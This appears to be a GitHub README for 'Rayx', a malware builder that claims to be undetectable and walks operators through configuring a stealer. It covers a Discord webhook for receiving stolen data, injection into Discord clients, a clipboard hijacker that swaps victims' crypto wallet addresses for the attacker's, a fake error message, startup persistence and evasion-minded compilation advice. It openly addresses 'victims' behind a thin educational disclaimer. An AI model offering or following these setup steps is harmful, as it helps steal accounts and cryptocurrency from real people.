...
##### Rayx's Code is fully undetectable, the only detections are the fault of pyinstaller we recommend to use Cx_Freeze to compile it.


##### [:gem: Premium](https://discord.gg/mrontop)
...
**NOTE:** 
- Rayx was made only for educational purposes, all consequences caused by your actions are **your** responsibility and accountability.
- If You've got an error or have found a bug ; join the discord server to submit it.

---

## <a id="content"></a>🌐 〢 Content

- [🌌・Discord](https://discord.gg/mrontop)
...
## <a id="setup"></a> 📁 〢 Setting up Rayx

1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
2. Install [Rayx Files](By Going Up And Click On Code And Download The Zip)
3. Install all requirements [install.bat](Run Builder.exe)
4. Click on start.bat [start.bat](Then After It Is Builded Run Setup.bat)
...
```d
@rayx: Here put your Discord Webhook you can find it in your "DISCORD CHANNEL OPTIONS" > "INTEGRATION" > "CREATE A WEBHOOK"
```
...
```d
@rayx: This is a option to "KILL" all discord clients opened and to restart them with the blackcap injection 
(so i recommand "yes")
```
...
```d
@rayx: This option replaces each of the crypto addresses copied by the victim with yours, 
...
```d
@rayx: If you chose 'yes' to the previous option you will have to fill in this with YOUR crypto wallet addresses 
(You can also put mine)👌
```
![](https://media.discordapp.net/attachments/912038729626058853/1062472209777574009/image.png)
```d
@rayx: This option allows you to display an error message when someone launches your blackcap 
...
```d
@rayx: This option will make a copy of the .exe in the windows startup of your victims and 
...
```d
@rayx: This option will close automatically the window that will launch blackcap 
...
```d
@rayx: This option will obfuscate the source code "BUT THIS OBFUSCATION WAS DETECTED"
I recommand to chose 'no'
```
![](https://media.discordapp.net/attachments/912038729626058853/1062474365079388201/image.png)
```d
@rayx: This option will create an .exe if you put 'no' the final file will be an .py
```
![](https://media.discordapp.net/attachments/912038729626058853/1062474813135925288/image.png)
```d
@rayx: If you chose 'yes' in the previous option this option will add an icon to your .exe
```
...
### Authors
prince [https://github.com/King-hxcker-xD]

### Contributors (CapingTeam)
- King

### <a id="forkedfrom"></a>🕵️‍♂️ 〢 Coded From:
